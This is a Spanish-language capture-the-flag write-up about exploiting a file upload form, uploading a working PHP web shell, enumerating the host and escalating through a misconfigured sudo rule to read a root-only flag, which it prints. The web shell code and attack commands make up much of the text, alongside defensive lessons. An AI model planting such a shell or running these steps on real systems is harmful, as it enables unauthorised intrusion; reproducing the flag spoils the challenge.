# Write-up de Reto: File Upload Exploitation

## 1. Descripción del Problema

El reto consiste en explotar una funcionalidad de carga de archivos (File Upload) para obtener acceso al sistema y, posteriormente, escalar privilegios para leer el archivo `flag.txt` restringido en el directorio `/root`.

## 2. Metodología de Ataque

### A. Reconocimiento y Carga de Archivos

- **Vector:** Formulario de carga de perfiles.
    
- **Hallazgo:** El servidor acepta archivos `.php` y permite acceder a ellos a través de la ruta `uploads/`.
    
- **Prueba de concepto:** Se subió un archivo `test.php` que imprime `PHP_IS_RUNNING` para verificar la ejecución.
    

### B. Implementación de Web Shell

Debido a restricciones de firewall (Egress Filtering), una _Reverse Shell_ estándar no conectaba. Se implementó una **Web Shell** para ejecutar comandos mediante peticiones HTTP.

PHP

```php
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    // Manejo de salida de errores y ejecución
    system($_GET['cmd'] . " 2>&1");
    echo "</pre>";
}
?>
```

### C. Enumeración del Sistema

Se utilizaron los siguientes comandos para explorar el sistema:

- `whoami`: Confirmar el usuario (`www-data`).
    ![[Pasted image 20260620150123.png]]
- `ls -la /`: Exploración inicial del sistema de archivos.
    ![[Pasted image 20260620150145.png]]
- `find / -name *flag* 2>/dev/null`: Localización del archivo de la flag.
    ![[Pasted image 20260620150226.png]]

### D. Escalada de Privilegios

Se utilizó `sudo -l` para verificar los permisos del usuario `www-data`.

- **Resultado:** `(ALL) NOPASSWD: ALL`
    ![[Pasted image 20260620150306.png]]
- **Explotación:** El usuario tiene privilegios totales de root sin necesidad de contraseña.
    

## 3. Resolución Final

Se utilizó `sudo` para leer el archivo restringido:

- **Comando:** `sudo cat /root/flag.txt`
    ![[Pasted image 20260620150329.png]]
- **Flag obtenida:** `picoCTF{wh47_c4n_u_d0_wPHP_2df2d584}`
    

## 4. Lecciones Aprendidas

1. **Seguridad en Carga de Archivos:** Nunca confiar en los archivos cargados por el usuario. Es necesario validar extensiones, tipos MIME y contenido.
    
2. **Web Shells como Alternativa:** Cuando el firewall bloquea conexiones salientes (`Reverse Shell`), las _Web Shells_ son una alternativa robusta y más difícil de detectar.
    
3. **Configuración de sudo:** Una mala configuración en el archivo `sudoers` (dar permisos de root a usuarios web) es un error crítico de seguridad.